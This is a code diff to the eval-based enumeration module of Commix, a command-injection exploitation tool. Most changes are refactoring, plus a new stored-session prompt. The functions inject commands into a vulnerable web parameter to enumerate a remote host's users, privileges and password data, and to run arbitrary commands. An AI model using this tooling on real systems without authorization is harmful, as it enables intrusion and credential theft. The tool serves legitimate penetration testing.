@@ -3,13 +3,13 @@
 
 """
 This file is part of Commix Project (https://commixproject.com).
-Copyright (c) 2014-2023 Anastasios Stasinopoulos (@ancst).
+Copyright (c) 2014-2024 Anastasios Stasinopoulos (@ancst).
 
 This program is free software: you can redistribute it and/or modify
 it under the terms of the GNU General Public License as published by
 the Free Software Foundation, either version 3 of the License, or
 (at your option) any later version.
- 
+
 For more see the file 'readme/COPYING' for copying permission.
 """
 
@@ -17,6 +17,7 @@ import re
 import sys
 from src.utils import logs
 from src.utils import menu
+from src.utils import common
 from src.utils import settings
 from src.utils import session_handler
 from src.core.injections.controller import checks
@@ -31,7 +32,7 @@ The dynamic code evaluation (aka eval-based) technique.
 """
 Powershell's version number enumeration (for Windows OS)
 """
-def powershell_version(separator, TAG, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename, timesec): 
+def powershell_version(separator, TAG, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename, timesec):
   _ = False
   cmd = settings.PS_VERSION
   if alter_shell:
@@ -47,7 +48,7 @@ def powershell_version(separator, TAG, prefix, suffix, whitespace, http_request_
       response = requests.url_reload(url, timesec)
     # Evaluate injection results.
     ps_version = eb_injector.injection_results(response, TAG, cmd)
-    ps_version = "".join(str(p) for p in ps_version).replace(settings.SINGLE_WHITESPACE, "", 1)
+    ps_version = "".join(str(p) for p in ps_version)
     session_handler.store_cmd(url, cmd, ps_version, vuln_parameter)
   else:
     ps_version = session_handler.export_stored_cmd(url, cmd, vuln_parameter)
@@ -58,8 +59,8 @@ Hostname enumeration
 """
 def hostname(separator, TAG, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename, timesec):
   _ = False
-  if settings.TARGET_OS == "win":
-    settings.HOSTNAME = settings.WIN_HOSTNAME 
+  if settings.TARGET_OS == settings.OS.WINDOWS:
+    settings.HOSTNAME = settings.WIN_HOSTNAME
   cmd = settings.HOSTNAME
   if session_handler.export_stored_cmd(url, cmd, vuln_parameter) == None or menu.options.ignore_session:
     # Command execution results.
@@ -69,7 +70,7 @@ def hostname(separator, TAG, prefix, suffix, whitespace, http_request_method, ur
       response = requests.url_reload(url, timesec)
     # Evaluate injection results.
     shell = eb_injector.injection_results(response, TAG, cmd)
-    shell = "".join(str(p) for p in shell).replace(settings.SINGLE_WHITESPACE, "", 1)
+    shell = "".join(str(p) for p in shell)
     session_handler.store_cmd(url, cmd, shell, vuln_parameter)
   else:
     shell = session_handler.export_stored_cmd(url, cmd, vuln_parameter)
@@ -79,10 +80,10 @@ def hostname(separator, TAG, prefix, suffix, whitespace, http_request_method, ur
 Retrieve system information
 """
 def system_information(separator, TAG, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename, timesec):
-  _ = False     
-  if settings.TARGET_OS == "win":
+  _ = False
+  if settings.TARGET_OS == settings.OS.WINDOWS:
     settings.RECOGNISE_OS = settings.WIN_RECOGNISE_OS
-  cmd = settings.RECOGNISE_OS        
+  cmd = settings.RECOGNISE_OS
   if session_handler.export_stored_cmd(url, cmd, vuln_parameter) == None or menu.options.ignore_session:
     # Command execution results.
     response = eb_injector.injection(separator, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename)
@@ -97,7 +98,7 @@ def system_information(separator, TAG, prefix, suffix, whitespace, http_request_
     target_os = session_handler.export_stored_cmd(url, cmd, vuln_parameter)
   if target_os:
     target_os = "".join(str(p) for p in target_os)
-    if settings.TARGET_OS != "win":
+    if settings.TARGET_OS != settings.OS.WINDOWS:
       cmd = settings.DISTRO_INFO
       if session_handler.export_stored_cmd(url, cmd, vuln_parameter) == None or menu.options.ignore_session:
         # Command execution results.
@@ -114,7 +115,7 @@ def system_information(separator, TAG, prefix, suffix, whitespace, http_request_
       else:
         target_os = session_handler.export_stored_cmd(url, cmd, vuln_parameter)
 
-    if settings.TARGET_OS == "win":
+    if settings.TARGET_OS == settings.OS.WINDOWS:
       cmd = settings.WIN_RECOGNISE_HP
     else:
       cmd = settings.RECOGNISE_HP
@@ -126,25 +127,27 @@ def system_information(separator, TAG, prefix, suffix, whitespace, http_request_
         response = requests.url_reload(url, timesec)
       # Evaluate injection results.
       target_arch = eb_injector.injection_results(response, TAG, cmd)
-      target_arch = "".join(str(p) for p in target_arch).replace(settings.SINGLE_WHITESPACE, "", 1)
+      target_arch = "".join(str(p) for p in target_arch)
       session_handler.store_cmd(url, cmd, target_arch, vuln_parameter)
     else:
       target_arch = session_handler.export_stored_cmd(url, cmd, vuln_parameter)
+  else:
+    target_arch = None
   checks.print_os_info(target_os, target_arch, filename, _)
-    
+
 """
 The current user enumeration
 """
 def current_user(separator, TAG, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename, timesec):
   _ = False
   cmd = settings.CURRENT_USER
-  if settings.TARGET_OS == "win":
+  if settings.TARGET_OS == settings.OS.WINDOWS:
     cmd = settings.WIN_CURRENT_USER
     # cmd = cmd + settings.WIN_REPLACE_WHITESPACE
     if alter_shell:
       cmd = checks.escape_single_quoted_cmd(cmd)
-    else:  
-      cmd = checks.quoted_cmd(cmd)  
+    else:
+      cmd = checks.quoted_cmd(cmd)
   if session_handler.export_stored_cmd(url, cmd, vuln_parameter) == None or menu.options.ignore_session:
     # Command execution results.
     response = eb_injector.injection(separator, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename)
@@ -153,23 +156,23 @@ def current_user(separator, TAG, prefix, suffix, whitespace, http_request_method
       response = requests.url_reload(url, timesec)
     # Evaluate injection results.
     cu_account = eb_injector.injection_results(response, TAG, cmd)
-    cu_account = "".join(str(p) for p in cu_account).replace(settings.SINGLE_WHITESPACE, "", 1)
+    cu_account = "".join(str(p) for p in cu_account)
     session_handler.store_cmd(url, cmd, cu_account, vuln_parameter)
   else:
     cu_account = session_handler.export_stored_cmd(url, cmd, vuln_parameter)
   checks.print_current_user(cu_account, filename, _)
 
 """
-Check if the current user has excessive privileges.
+Check if the Current user is privileged.
 """
 def check_current_user_privs(separator, TAG, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename, timesec):
   _ = False
-  if settings.TARGET_OS == "win":
+  if settings.TARGET_OS == settings.OS.WINDOWS:
     cmd = settings.IS_ADMIN
     if not alter_shell:
-      cmd = cmd = checks.quoted_cmd(cmd) 
-  else:  
-    cmd = settings.IS_ROOT 
+      cmd = cmd = checks.quoted_cmd(cmd)
+  else:
+    cmd = settings.IS_ROOT
   if session_handler.export_stored_cmd(url, cmd, vuln_parameter) == None or menu.options.ignore_session:
     # Command execution results.
     response = eb_injector.injection(separator, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename)
@@ -178,7 +181,7 @@ def check_current_user_privs(separator, TAG, prefix, suffix, whitespace, http_re
       response = requests.url_reload(url, timesec)
     # Evaluate injection results.
     shell = eb_injector.injection_results(response, TAG, cmd)
-    shell = "".join(str(p) for p in shell).replace(settings.SINGLE_WHITESPACE, "", 1)
+    shell = "".join(str(p) for p in shell)
     session_handler.store_cmd(url, cmd, shell, vuln_parameter)
   else:
     shell = session_handler.export_stored_cmd(url, cmd, vuln_parameter)
@@ -187,15 +190,15 @@ def check_current_user_privs(separator, TAG, prefix, suffix, whitespace, http_re
 """
 System users enumeration
 """
-def system_users(separator, TAG, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename, timesec): 
+def system_users(separator, TAG, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename, timesec):
   _ = False
-  cmd = settings.EVAL_SYS_USERS     
-  if settings.TARGET_OS == "win":
+  cmd = settings.EVAL_SYS_USERS
+  if settings.TARGET_OS == settings.OS.WINDOWS:
     cmd = settings.WIN_SYS_USERS
     if alter_shell:
       cmd = checks.escape_single_quoted_cmd(cmd)
-    else:  
-      cmd = checks.quoted_cmd(cmd)                 
+    else:
+      cmd = checks.quoted_cmd(cmd)
   if session_handler.export_stored_cmd(url, cmd, vuln_parameter) == None or menu.options.ignore_session:
     # Command execution results.
     response = eb_injector.injection(separator, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename)
@@ -209,13 +212,13 @@ def system_users(separator, TAG, prefix, suffix, whitespace, http_request_method
   else:
     sys_users = session_handler.export_stored_cmd(url, cmd, vuln_parameter)
   checks.print_users(sys_users, filename, _, separator, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell)
-      
+
 """
 System passwords enumeration
 """
-def system_passwords(separator, TAG, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename, timesec):  
-  _ = False       
-  cmd = settings.SYS_PASSES            
+def system_passwords(separator, TAG, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename, timesec):
+  _ = False
+  cmd = settings.SYS_PASSES
   if session_handler.export_stored_cmd(url, cmd, vuln_parameter) == None or menu.options.ignore_session:
     # Command execution results.
     response = eb_injector.injection(separator, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename)
@@ -244,18 +247,18 @@ def single_os_cmd_exec(separator, TAG, prefix, suffix, whitespace, http_request_
       response = requests.url_reload(url, timesec)
     # Evaluate injection results.
     shell = eb_injector.injection_results(response, TAG, cmd)
-    shell = "".join(str(p) for p in shell).replace(settings.SINGLE_WHITESPACE, "", 1)
+    shell = "".join(str(p) for p in shell)
     session_handler.store_cmd(url, cmd, shell, vuln_parameter)
   else:
     shell = session_handler.export_stored_cmd(url, cmd, vuln_parameter)
-  checks.print_single_os_cmd(cmd, shell) 
+  checks.print_single_os_cmd(cmd, shell, filename)
 
 """
 Check the defined options
 """
 def do_check(separator, TAG, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename, timesec):
   # Check if PowerShell is enabled.
-  if not menu.options.ps_version and settings.TARGET_OS == "win":
+  if not menu.options.ps_version and settings.TARGET_OS == settings.OS.WINDOWS:
     checks.ps_check()
 
   if menu.options.ps_version and settings.PS_ENABLED == None:
@@ -268,7 +271,7 @@ def do_check(separator, TAG, prefix, suffix, whitespace, http_request_method, ur
     checks.print_enumenation().hostname_msg()
     hostname(separator, TAG, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename, timesec)
     settings.ENUMERATION_DONE = True
-    
+
   if menu.options.current_user:
     checks.print_enumenation().current_user_msg()
     current_user(separator, TAG, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename, timesec)
@@ -290,7 +293,7 @@ def do_check(separator, TAG, prefix, suffix, whitespace, http_request_method, ur
     settings.ENUMERATION_DONE = True
 
   if menu.options.passwords:
-    if settings.TARGET_OS == "win":
+    if settings.TARGET_OS == settings.OS.WINDOWS:
       check_option = "--passwords"
       checks.unavailable_option(check_option)
     else:
@@ -298,4 +301,31 @@ def do_check(separator, TAG, prefix, suffix, whitespace, http_request_method, ur
       system_passwords(separator, TAG, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename, timesec)
     settings.ENUMERATION_DONE = True
 
+"""
+Check stored session
+"""
+def stored_session(separator, TAG, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename, timesec):
+  # Check for any enumeration options.
+  new_line = True
+  if settings.ENUMERATION_DONE == True :
+    while True:
+      message = "Do you want to ignore stored session and enumerate again? [y/N] > "
+      enumerate_again = common.read_input(message, default="N", check_batch=True)
+      if enumerate_again in settings.CHOICE_YES:
+        if not menu.options.ignore_session:
+          menu.options.ignore_session = True
+        do_check(separator, TAG, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename, timesec)
+        break
+      elif enumerate_again in settings.CHOICE_NO:
+        new_line = False
+        break
+      elif enumerate_again in settings.CHOICE_QUIT:
+        raise SystemExit()
+      else:
+        common.invalid_option(enumerate_again)
+        pass
+  else:
+    if menu.enumeration_options():
+      do_check(separator, TAG, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename, timesec)
+      
 # eof
